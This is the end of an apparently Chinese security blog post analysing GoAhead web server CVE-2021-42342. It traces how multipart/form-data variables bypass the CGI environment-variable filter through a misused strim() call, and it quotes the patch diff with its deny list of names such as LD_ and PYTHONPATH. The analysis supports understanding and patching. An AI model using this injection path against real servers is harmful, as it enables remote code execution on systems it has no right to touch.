</span><span style="color:#c0c5ce;">                </span><span style="color:#8fa1b3;">trace</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">Env[</span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;">] </span><span style="color:#d08770;">%s</span><span style="color:#c0c5ce;">&quot;, n, envp[n-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">]);
</span><span style="color:#c0c5ce;">                </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(n &gt;= envpsize) {
</span><span style="color:#c0c5ce;">                    envpsize *= </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">                    envp = </span><span style="color:#8fa1b3;">wrealloc</span><span style="color:#c0c5ce;">(envp, envpsize * sizeof(</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*));
</span><span style="color:#c0c5ce;">                }
</span><span style="color:#c0c5ce;">            }
</span></pre>
<p>这里最终调用<code>strspn(str, set)</code>，但<code>set</code>为<code>'\0'</code>，导致该函数使用只会返回0，从而后续字符串判断过滤都失效</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">PUBLIC </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*</span><span style="color:#8fa1b3;">strim</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">str</span><span style="color:#c0c5ce;">, cchar *</span><span style="color:#bf616a;">set</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">where</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char    </span><span style="color:#c0c5ce;">*s;
</span><span style="color:#c0c5ce;">    ssize   len, i;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(str == </span><span style="color:#d08770;">0 </span><span style="color:#c0c5ce;">|| set == </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(where &amp; WEBS_TRIM_START) {
</span><span style="color:#c0c5ce;">        i = </span><span style="color:#96b5b4;">strspn</span><span style="color:#c0c5ce;">(str, set);
</span><span style="color:#c0c5ce;">    } </span><span style="color:#b48ead;">else </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">        i = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    s = (</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;">*) &amp;str[i];
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(where &amp; WEBS_TRIM_END) {
</span><span style="color:#c0c5ce;">        len = </span><span style="color:#96b5b4;">strlen</span><span style="color:#c0c5ce;">(s);
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">while </span><span style="color:#c0c5ce;">(len &gt; </span><span style="color:#d08770;">0 </span><span style="color:#c0c5ce;">&amp;&amp; </span><span style="color:#96b5b4;">strspn</span><span style="color:#c0c5ce;">(&amp;s[len - </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">], set) &gt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">            s[len - </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">] = &#39;</span><span style="color:#96b5b4;">\0</span><span style="color:#c0c5ce;">&#39;;
</span><span style="color:#c0c5ce;">            len--;
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> s;
</span><span style="color:#c0c5ce;">}
</span></pre>
<p>但是注意上面代码中存在两条分支，第一个if语句最终保存的变量名使用前缀<code>ME_GOAHEAD_CGI_VAR_PREFIX</code>即<code>CGI_</code>，而else语句中不会使用前缀可以注入，则需要找到如何实现<code>s-&gt;arg == 0</code></p>
<p>回看之前通过GET参数注入环境变量的漏洞相关代码，添加变量的<code>addFormVars</code>中倒数第二行出现<code>sp-&gt;arg=1</code>，这里就是将添加的变量标记为不可信</p>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">/*
</span><span style="color:#65737e;">    NOTE: the vars variable is modified
</span><span style="color:#65737e;"> */
</span><span style="color:#b48ead;">static void </span><span style="color:#8fa1b3;">addFormVars</span><span style="color:#c0c5ce;">(Webs *</span><span style="color:#bf616a;">wp</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">vars</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    WebsKey     *sp;
</span><span style="color:#c0c5ce;">    cchar       *prior;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char        </span><span style="color:#c0c5ce;">*keyword, *value, *tok;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">assert</span><span style="color:#c0c5ce;">(wp);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">assert</span><span style="color:#c0c5ce;">(vars);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    keyword = </span><span style="color:#8fa1b3;">stok</span><span style="color:#c0c5ce;">(vars, &quot;</span><span style="color:#a3be8c;">&amp;</span><span style="color:#c0c5ce;">&quot;, &amp;tok);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">while </span><span style="color:#c0c5ce;">(keyword != </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((value = </span><span style="color:#96b5b4;">strchr</span><span style="color:#c0c5ce;">(keyword, &#39;</span><span style="color:#a3be8c;">=</span><span style="color:#c0c5ce;">&#39;)) != </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">            *value++ = &#39;</span><span style="color:#96b5b4;">\0</span><span style="color:#c0c5ce;">&#39;;
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">websDecodeUrl</span><span style="color:#c0c5ce;">(keyword, keyword, </span><span style="color:#96b5b4;">strlen</span><span style="color:#c0c5ce;">(keyword));
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">websDecodeUrl</span><span style="color:#c0c5ce;">(value, value, </span><span style="color:#96b5b4;">strlen</span><span style="color:#c0c5ce;">(value));
</span><span style="color:#c0c5ce;">        } </span><span style="color:#b48ead;">else </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">            value = &quot;&quot;;
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(*keyword) {
</span><span style="color:#c0c5ce;">            </span><span style="color:#65737e;">/*
</span><span style="color:#65737e;">                If keyword has already been set, append the new value to what has been stored.
</span><span style="color:#65737e;">             */
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((prior = </span><span style="color:#8fa1b3;">websGetVar</span><span style="color:#c0c5ce;">(wp, keyword, </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">)) != </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">                sp = </span><span style="color:#8fa1b3;">websSetVarFmt</span><span style="color:#c0c5ce;">(wp, keyword, &quot;</span><span style="color:#d08770;">%s %s</span><span style="color:#c0c5ce;">&quot;, prior, value);
</span><span style="color:#c0c5ce;">            } </span><span style="color:#b48ead;">else </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">                sp = </span><span style="color:#8fa1b3;">websSetVar</span><span style="color:#c0c5ce;">(wp, keyword, value);
</span><span style="color:#c0c5ce;">            }
</span><span style="color:#c0c5ce;">            </span><span style="color:#65737e;">/* Flag as untrusted keyword by setting arg to 1. This is used by CGI to prefix this keyword */
</span><span style="color:#c0c5ce;">            sp-&gt;arg = </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">        keyword = </span><span style="color:#8fa1b3;">stok</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">&amp;</span><span style="color:#c0c5ce;">&quot;, &amp;tok);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">}
</span></pre>
<p>于是方向变成了寻找有没有既是用户可控，又没有被标记为不可信变量的注入点</p>
<p>全局搜一下函数<code>websSetVar()</code>很明显能发现<code>upload.c</code>中<code>processContentData()</code>函数在设置变量后没有修改<code>arg</code>，其值默认为0</p>
<p>最终跟踪调用能跟到下面代码，说明需要通过<code>multipart/form-data</code>触发</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">else if </span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">strcmp</span><span style="color:#c0c5ce;">(key, &quot;</span><span style="color:#a3be8c;">content-type</span><span style="color:#c0c5ce;">&quot;) == </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">wfree</span><span style="color:#c0c5ce;">(wp-&gt;contentType);
</span><span style="color:#c0c5ce;">	wp-&gt;contentType = </span><span style="color:#8fa1b3;">sclone</span><span style="color:#c0c5ce;">(value);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">strstr</span><span style="color:#c0c5ce;">(value, &quot;</span><span style="color:#a3be8c;">application/x-www-form-urlencoded</span><span style="color:#c0c5ce;">&quot;)) {
</span><span style="color:#c0c5ce;">		wp-&gt;flags |= WEBS_FORM;
</span><span style="color:#c0c5ce;">	} </span><span style="color:#b48ead;">else if </span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">strstr</span><span style="color:#c0c5ce;">(value, &quot;</span><span style="color:#a3be8c;">application/json</span><span style="color:#c0c5ce;">&quot;)) {
</span><span style="color:#c0c5ce;">		wp-&gt;flags |= WEBS_JSON;
</span><span style="color:#c0c5ce;">	} </span><span style="color:#b48ead;">else if </span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">strstr</span><span style="color:#c0c5ce;">(value, &quot;</span><span style="color:#a3be8c;">multipart/form-data</span><span style="color:#c0c5ce;">&quot;)) {
</span><span style="color:#c0c5ce;">		wp-&gt;flags |= WEBS_UPLOAD;
</span><span style="color:#c0c5ce;">	}
</span></pre>
<p>最终观察代码可以发现，<code>name=</code>后内容被设置为<code>wp-&gt;uploadVar</code></p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">else if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">scaselesscmp</span><span style="color:#c0c5ce;">(key, &quot;</span><span style="color:#a3be8c;">name</span><span style="color:#c0c5ce;">&quot;) == </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">                </span><span style="color:#8fa1b3;">wfree</span><span style="color:#c0c5ce;">(wp-&gt;uploadVar);
</span><span style="color:#c0c5ce;">                wp-&gt;uploadVar = </span><span style="color:#8fa1b3;">sclone</span><span style="color:#c0c5ce;">(value);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            }
</span></pre>
<p>并在<code>upload.c</code>中<code>processContentData</code>函数被设置到哈希表中，且未修改<code>arg</code></p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">else if </span><span style="color:#c0c5ce;">(wp-&gt;uploadVar) {
</span><span style="color:#c0c5ce;">            </span><span style="color:#65737e;">/*
</span><span style="color:#65737e;">                Normal string form data variables
</span><span style="color:#65737e;">             */
</span><span style="color:#c0c5ce;">            data[len] = &#39;</span><span style="color:#96b5b4;">\0</span><span style="color:#c0c5ce;">&#39;;
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">trace</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">5</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">uploadFilter: form[</span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;">] = </span><span style="color:#d08770;">%s</span><span style="color:#c0c5ce;">&quot;, wp-&gt;uploadVar, data);
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">websDecodeUrl</span><span style="color:#c0c5ce;">(wp-&gt;uploadVar, wp-&gt;uploadVar, -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">websDecodeUrl</span><span style="color:#c0c5ce;">(data, data, -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">websSetVar</span><span style="color:#c0c5ce;">(wp, wp-&gt;uploadVar, data);
</span><span style="color:#c0c5ce;">        }
</span></pre>
<p>从而可以通过在<code>multipart/form-data</code>中上传变量来注入环境变量</p>
<h3 id="bu-ding">补丁</h3><p>使用<code>multipart/form-data</code>上传的变量也标记了不可信
同时修正了<code>strim</code>的使用</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">@@ -320,6 +320,7 @@ static bool processContentData(Webs *wp)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    WebsUpload  *file;
</span><span style="color:#c0c5ce;">    WebsBuf     *content;
</span><span style="color:#a3be8c;">+    WebsKey     *sp;
</span><span style="color:#c0c5ce;">    ssize       size, nbytes, len;
</span><span style="color:#c0c5ce;">    char        *data, *bp;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">@@ -380,7 +381,9 @@ static bool processContentData(Webs *wp)
</span><span style="color:#c0c5ce;">            trace(5, &quot;uploadFilter: form[%s] = %s&quot;, wp-&gt;uploadVar, data);
</span><span style="color:#c0c5ce;">            websDecodeUrl(wp-&gt;uploadVar, wp-&gt;uploadVar, -1);
</span><span style="color:#c0c5ce;">            websDecodeUrl(data, data, -1);
</span><span style="color:#bf616a;">-           websSetVar(wp, wp-&gt;uploadVar, data);
</span><span style="color:#a3be8c;">+            sp = websSetVar(wp, wp-&gt;uploadVar, data);
</span><span style="color:#a3be8c;">+            //  Flag as untrusted so CGI will prefix
</span><span style="color:#a3be8c;">+            sp-&gt;arg = 1;
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">        websConsumeInput(wp, nbytes);
</span><span style="color:#c0c5ce;">    }
</span></pre>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">@@ -173,10 +173,10 @@ PUBLIC bool cgiHandler(Webs *wp)
</span><span style="color:#c0c5ce;">    if (wp-&gt;vars) {
</span><span style="color:#c0c5ce;">        for (n = 0, s = hashFirst(wp-&gt;vars); s != NULL; s = hashNext(wp-&gt;vars, s)) {
</span><span style="color:#c0c5ce;">            if (s-&gt;content.valid &amp;&amp; s-&gt;content.type == string) {
</span><span style="color:#bf616a;">-                vp = strim(s-&gt;name.value.string, 0, WEBS_TRIM_START);
</span><span style="color:#a3be8c;">+                vp = strim(s-&gt;name.value.string, &quot; \t\r\n&quot;, WEBS_TRIM_BOTH);
</span><span style="color:#c0c5ce;">                if (smatch(vp, &quot;REMOTE_HOST&quot;) || smatch(vp, &quot;HTTP_AUTHORIZATION&quot;) ||
</span><span style="color:#c0c5ce;">                    smatch(vp, &quot;IFS&quot;) || smatch(vp, &quot;CDPATH&quot;) ||
</span><span style="color:#bf616a;">-                    smatch(vp, &quot;PATH&quot;) || sstarts(vp, &quot;LD_&quot;)) {
</span><span style="color:#a3be8c;">+                    smatch(vp, &quot;PATH&quot;) || sstarts(vp, &quot;PYTHONPATH&quot;) || sstarts(vp, &quot;LD_&quot;)) {
</span><span style="color:#c0c5ce;">                    continue;
</span><span style="color:#c0c5ce;">                }
</span><span style="color:#c0c5ce;">                if (s-&gt;arg != 0 &amp;&amp; *ME_GOAHEAD_CGI_VAR_PREFIX != &#39;\0&#39;) {
</span></pre>
<h2 id="reference">reference</h2><ul>
<li><a href="https://tttang.com/archive/1399/#toc_0x01">GoAhead环境变量注入复现踩坑记</a></li>
<li><a href="https://bestwing.me/CVE-2021-42342-Goahead.html">CVE-2021-42342 Goahead 环境变量注入漏洞分析</a></li>
<li><a href="https://xz.aliyun.com/t/6407">CVE-2017-17562 GoAhead远程代码执行漏洞分析</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=Mzk0NTU5Mjg0Ng==&amp;mid=2247491368&amp;idx=1&amp;sn=6c9f9a0d8c31b8e8ee0f6d6cb6e88bd3&amp;source=41#wechat_redirect">【最新漏洞预警】CVE-2021-42342 GoAhead 远程命令执行漏洞深入分析与复现（警惕！影响范围广泛）</a></li>
</ul>
</main>
                <aside class="toc-sidebar">
                    <div class="toc-sticky-container">
                        <div class="toc-header">:: Contents ::</div>
                        <ul class="toc-list"><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#cve-2017-17562">CVE-2017-17562</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#miao-shu">描述</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#fu-xian">复现</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#fen-xi">分析</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#li-yong">利用</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#bu-ding">补丁</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#cve-2021-42342">CVE-2021-42342</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#miao-shu">描述</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#huan-jing">环境</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#fu-xian">复现</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#fen-xi">分析</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#bu-ding">补丁</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#reference">reference</a></li></ul>
                    </div>
                </aside>
            </div> 
    <footer style="margin-top: 50px; border-top: 1px solid #333; padding-top: 20px; font-size: 0.8rem; color: #555; text-align: center;">
        Built with Rust. <span style="color: #66ed59;">EOF</span>
    </footer>
    <button id="back-to-top" aria-label="Back to Top">^TOP</button>
    <script src="script.js"></script>
</body>
</html>